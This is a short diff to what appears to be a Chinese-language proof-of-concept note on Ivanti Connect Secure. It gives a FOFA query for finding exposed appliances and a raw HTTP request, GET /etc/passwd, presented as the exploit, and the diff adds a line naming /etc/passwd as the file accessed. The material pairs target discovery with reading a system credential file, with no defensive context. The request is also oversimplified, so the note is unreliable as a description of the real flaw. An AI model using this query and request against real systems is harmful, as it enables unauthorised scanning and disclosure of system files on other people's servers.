@@ -1,4 +1,6 @@
 fofa语句：title="Ivanti Connect Secure"
+
+access: /etc/passwd
 POC展示
 GET /etc/passwd HTTP/1.1
 Host: example.com
